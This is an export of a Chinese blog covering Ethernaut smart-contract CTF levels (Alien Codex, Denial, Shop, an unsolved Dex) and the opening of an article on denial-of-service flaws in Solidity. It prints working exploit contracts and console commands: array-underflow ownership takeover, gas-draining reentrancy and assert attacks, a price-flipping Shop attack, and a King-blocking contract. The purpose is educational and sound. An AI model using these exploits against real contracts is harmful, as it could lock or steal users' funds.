<h2 id="0x14-Alien-Codex"><a href="#0x14-Alien-Codex" class="headerlink" title="0x14 Alien Codex"></a>0x14 Alien Codex</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;../helpers/Ownable-05.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">contacted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">make_contact</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params">bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">retract</span>(<span class="params"></span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">revise</span>(<span class="params">uint i, bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>合约开头引入了<a href="https://github.com/OpenZeppelin/ethernaut/tree/master/contracts/helpers">Ownable合约</a>，同时也引入了一个 <code>owner</code> 变量</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;<span class="built_in">console</span>.info(y)&#125;);</span><br><span class="line"><span class="comment">// 0x00000000000000000000000073048cec9010e92c298b016966bde1cc47299df5 slot0</span></span><br><span class="line"><span class="comment">// 对应的 contact 为零,Owner=0x73048cec9010e92c298b016966bde1cc47299df5</span></span><br></pre></td></tr></table></figure>
<p>codex储存的位置是从slot1同时这里也是储存数组长度的地方，而 codex 的实际内容存储在 <code>keccak256(bytes32(1))</code> 开始的位置，EVM的储存方式是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">array[array_slot_index] == SLOAD(keccak256(slot(array)) + slot_index)</span><br><span class="line">codex[<span class="number">0</span>] =eb3.eth.getStorageAt(contract.address,keccak_256(byte32(<span class="number">1</span>)) <span class="comment">//byte32用于填充0</span></span><br><span class="line"><span class="comment">//下面暂且记作slotx</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210626155940718-7093025.png" alt></p>
<p>也就是说我们对codex[0]进行偏移，就能得到codex[y]=slot0，也就能达到修改slot0的目的</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">y</span>=<span class="number">2</span>^<span class="number">256</span>-x+<span class="number">0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract.revise(<span class="string">&#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;</span>,<span class="string">&#x27;0x000000000000000000000001e510Ac7b174D055679d38450c42AD07bC65E0bc9&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>但是再次之前，我们需要绕过修饰关键词contacted的限制，也就是需要使contact = true，那就是调用make_contact() 函数，此时我们想要读取到codex[y]，slot1存储的数组长度大于y，很显然 retract()函数能帮助我们进行下溢。record或者也可以一直调用record，在第y次时传入正确的参数</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">contract.retract()</span><br><span class="line"><span class="regexp">//</span> codex.length--</span><br><span class="line">await web3.eth.getStorageAt(contract.address, <span class="number">1</span>)</span><br><span class="line"><span class="regexp">//</span> codex.length</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span>xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">await contract.owner()</span><br><span class="line"><span class="regexp">//</span> <span class="string">&quot;0x73048cec9010e92c298b016966bde1cc47299df5&quot;</span></span><br><span class="line">contract.revise(<span class="string">&#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;</span>,<span class="string">&quot;0x000000000000000000000001+Player address&quot;</span>)</span><br><span class="line"><span class="regexp">//</span> 调用 revise()</span><br><span class="line">await contract.owner()</span><br><span class="line"><span class="regexp">//</span> Player address</span><br><span class="line"><span class="regexp">//</span> Submit instance</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210626142522049-7093025.png" alt="image-20210626142522049"></p>
<h2 id="0x15-Denial"><a href="#0x15-Denial" class="headerlink" title="0x15 Denial"></a>0x15 Denial</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">using</span> SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">    address <span class="built_in">public</span> partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable <span class="built_in">public</span> <span class="keyword">constant</span> owner = address(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    <span class="keyword">mapping</span>(address =&gt; uint) withdrawPartnerBalances; // keep track <span class="keyword">of</span> partners balances</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> setWithdrawPartner(address _partner) <span class="built_in">public</span> &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw <span class="number">1</span>% <span class="keyword">to</span> recipient <span class="keyword">and</span> <span class="number">1</span>% <span class="keyword">to</span> <span class="keyword">owner</span></span><br><span class="line">    <span class="keyword">function</span> withdraw() <span class="built_in">public</span> &#123;</span><br><span class="line">        uint amountToSend = address(this).balance.div(<span class="number">100</span>);</span><br><span class="line">        // <span class="keyword">perform</span> a <span class="keyword">call</span> <span class="keyword">without</span> checking <span class="keyword">return</span></span><br><span class="line">        // The recipient can revert, the <span class="keyword">owner</span> will still <span class="keyword">get</span> their <span class="keyword">share</span></span><br><span class="line">        partner.<span class="keyword">call</span>.<span class="keyword">value</span>(amountToSend)(&quot;&quot;);</span><br><span class="line">        <span class="keyword">owner</span>.transfer(amountToSend);</span><br><span class="line">        // keep track <span class="keyword">of</span> last withdrawal <span class="type">time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].<span class="keyword">add</span>(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit <span class="keyword">of</span> funds</span><br><span class="line">    fallback() <span class="keyword">external</span> payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience <span class="keyword">function</span></span><br><span class="line">    <span class="keyword">function</span> contractBalance() <span class="built_in">public</span> <span class="keyword">view</span> <span class="keyword">returns</span> (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求我们让其他人无法提款。分析一下合约</p>
<p>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Denial target = Denial(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.setWithdrawPartner(address(<span class="built_in">this</span>));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了</p>
<figure class="highlight irpf90"><table><tr><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Denial <span class="keyword">target</span> = Denial(instance_address);</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> hack() <span class="keyword">public</span> &#123;</span><br><span class="line">        <span class="keyword">target</span>.setWithdrawPartner(address(this));</span><br><span class="line">        <span class="keyword">target</span>.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span></span> () payable <span class="keyword">public</span> &#123;</span><br><span class="line">        <span class="keyword">assert</span>(<span class="number">0</span>==<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210626164122137-7093025.png" alt="image-20210626164122137"></p>
<h2 id="0x16-Shop"><a href="#0x16-Shop" class="headerlink" title="0x16 Shop"></a>0x16 Shop</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price.gas(<span class="number">3000</span>)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.price.gas(<span class="number">3000</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目要求少于指定价格得到商品，price&lt;100</p>
<p>发现 <code>isSold</code> 是 <code>public</code> 属性，所以可以利用 <code>isSold</code> ，根据 <code>isSold</code> 进行判断，两次调用 <code>_buyer.price.gas(3000)()</code> 第一次返回大于等于 <code>100</code> ，第二次返回小于 <code>100</code> 即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract AttackShop &#123;</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;  </span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Call Shop.buy()</span></span><br><span class="line">            mstore(<span class="number">0x20</span>, <span class="number">0xa6f2ae3a00000000000000000000000000000000000000000000000000000000</span>) <span class="comment">/* selector(buy()) */</span></span><br><span class="line">            <span class="keyword">let</span> success := call(<span class="number">100000</span>, <span class="number">0x81204a9d43123Df65D6089f4bF7493E43c1868b9</span>, <span class="number">0</span>, <span class="number">0x20</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="function"><span class="title">iszero</span>(<span class="params">success</span>)</span> &#123;</span><br><span class="line">                revert(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">0</span>, <span class="number">0x0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">         </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210626174120276-7093025.png" alt="image-20210626174120276"></p>
<h2 id="0x17-Dex"><a href="#0x17-Dex" class="headerlink" title="0x17 Dex"></a>0x17 Dex</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Dex  &#123;</span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _token1, address _token2</span>) <span class="title">public</span> &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(IERC20(<span class="keyword">from</span>).balanceOf(msg.sender) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swap_amount = get_swap_price(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    IERC20(<span class="keyword">from</span>).transferFrom(msg.sender, address(<span class="built_in">this</span>), amount);</span><br><span class="line">    IERC20(to).approve(address(<span class="built_in">this</span>), swap_amount);</span><br><span class="line">    IERC20(to).transferFrom(address(<span class="built_in">this</span>), msg.sender, swap_amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">add_liquidity</span>(<span class="params">address token_address, uint amount</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(<span class="built_in">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_swap_price</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * IERC20(to).balanceOf(address(<span class="built_in">this</span>)))/IERC20(<span class="keyword">from</span>).balanceOf(address(<span class="built_in">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address spender, uint amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address token, address account</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  <span class="title">constructor</span>(<span class="params">string memory name, string memory symbol, uint initialSupply</span>) <span class="title">public</span> <span class="title">ERC20</span>(<span class="params">name, symbol</span>) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address owner, address spender, uint amount</span>) <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对不起这道题还得做一段时间，如果做出来了再更新吧</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约拒绝服务漏洞</title>
    <url>/2021/07/19/20/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>文章首发<a href="https://xz.aliyun.com/t/9871">先知社区</a></p>
<p>拒绝服务漏洞，简称DOS，是一种旨在破坏正常的服务，使得服务中断或者暂停，导致用户无法访问或者使用服务</p>
<p>同时在智能合约中也可能存在拒绝服务漏洞，使得发生锁币，无法正常竞拍等等现象发生，从而带来恶劣的影响。</p>
<h1 id="0x02-预备知识"><a href="#0x02-预备知识" class="headerlink" title="0x02 预备知识"></a>0x02 预备知识</h1><p>本部分简略介绍应该掌握的知识点</p>
<ul>
<li>Send,Transfer</li>
<li>Call,Delegatecall,Callcode</li>
<li>函数修饰关键词</li>
<li>Require,Revert</li>
<li>合约继承</li>
<li>数组和映射</li>
<li>gas费率</li>
</ul>
<h1 id="0x03-已知漏洞类型"><a href="#0x03-已知漏洞类型" class="headerlink" title="0x03 已知漏洞类型"></a>0x03 已知漏洞类型</h1><p>本部分将归纳出现的拒绝服务漏洞类型</p>
<ol>
<li>未设定gas费率的外部调用</li>
<li>依赖外部的调用进展</li>
<li>owner错误操作</li>
<li>数组或映射过长</li>
<li>逻辑设计错误</li>
<li>缺少依赖库</li>
</ol>
<p>下面将结合简单的示例或真实存在的受害合约进行分析</p>
<h1 id="0x04-未设定gas费率的外部调用"><a href="#0x04-未设定gas费率的外部调用" class="headerlink" title="0x04 未设定gas费率的外部调用"></a>0x04 未设定gas费率的外部调用</h1><p>在合约中你可能想要通过call调用去执行某些东西的时候，因为未设定gas费率导致可能发生恶意的调用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address payable public constant owner = address(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setWithdrawPartner</span>(<span class="params">address _partner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="built_in">this</span>).balance.div(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.call.value(amountToSend)(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contractBalance</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="built_in">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Denial target = Denial(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.setWithdrawPartner(address(<span class="built_in">this</span>));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line">    Denial target = Denial(instance_address);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.setWithdrawPartner(address(<span class="built_in">this</span>));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        assert(<span class="number">0</span>==<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-依赖外部的调用进展"><a href="#0x05-依赖外部的调用进展" class="headerlink" title="0x05 依赖外部的调用进展"></a>0x05 依赖外部的调用进展</h1><p>这类漏洞常见于竞拍的合约当中，你的想法是如果有人出价高于现阶段的价格，就把当前的竞拍者的token退还给他，再去更新竞拍者，殊不知transfer函数执行失败后，亦会使下面的步骤无法执行。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_king</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address payable</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p>
<p><img src="/2021/07/19/20/202107190224.png" alt="202107190224"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address target</span>) <span class="title">public</span> <span class="title">payable</span>&#123;</span><br><span class="line">        target.call.gas(<span class="number">1000000</span>).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//未定义fallback函数，就没有payable修饰</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/19/20/截屏2021-07-19 14.37.45.png" alt="截屏2021-07-19 14.37.45"></p>
<h1 id="0x06-owner错误操作"><a href="#0x06-owner错误操作" class="headerlink" title="0x06 owner错误操作"></a>0x06 owner错误操作</h1><p>本类型涉及到函数修饰关键词的使用，owner可以设定合约的当前状态，因为错误的操作使得当前合约的状态设置为不可交易，出现非主观的拒绝服务。将令牌系统理解为股市，有时需要进行休市操作。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract error&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool activestatus;</span><br><span class="line">    </span><br><span class="line">    modifier onlyowner&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender==owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier active&#123;</span><br><span class="line">        <span class="built_in">require</span>(activestatus);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">activecontract</span>(<span class="params"></span>) <span class="title">onlyowner</span></span>&#123;</span><br><span class="line">        activestatus = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inactivecontract</span>(<span class="params"></span>) <span class="title">onlyowner</span></span>&#123;</span><br><span class="line">        activestatus = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params"></span>) <span class="title">active</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果owner调用了inactivecontract函数，使得activestatus变成false</p>
<p>之后所有被active修饰的函数都无法调用，无法通过require判定</p>
<p>令牌生态系统的整个操作取决于一个地址，这是非常危险的</p>
<h1 id="0x07-数组或映射过长"><a href="#0x07-数组或映射过长" class="headerlink" title="0x07 数组或映射过长"></a>0x07 数组或映射过长</h1><p>本类型的漏洞存在于利益分发合约，类似于公司给股东的分红，但是由于以太坊区块有gas费率交易上限，如果数组过大会导致操作执行的gas远远超出上限，从而导致交易失败，也就无法分红</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract DistributeTokens &#123;</span><br><span class="line">    address public owner; <span class="comment">// gets set somewhere</span></span><br><span class="line">    address[] investors; <span class="comment">// array of investors</span></span><br><span class="line">    uint[] investorTokens; <span class="comment">// the amount of tokens each investor gets</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... extra functionality, including transfertoken()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">invest</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        investors.push(msg.sender);</span><br><span class="line">        investorTokens.push(msg.value * <span class="number">5</span>); <span class="comment">// 5 times the wei sent</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">distribute</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner); <span class="comment">// only owner</span></span><br><span class="line">        <span class="keyword">for</span>(uint i = <span class="number">0</span>; i &lt; investors.length; i++) &#123; </span><br><span class="line">            <span class="comment">// here transferToken(to,amount) transfers &quot;amount&quot; of tokens to the address &quot;to&quot;</span></span><br><span class="line">            transferToken(investors[i],investorTokens[i]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
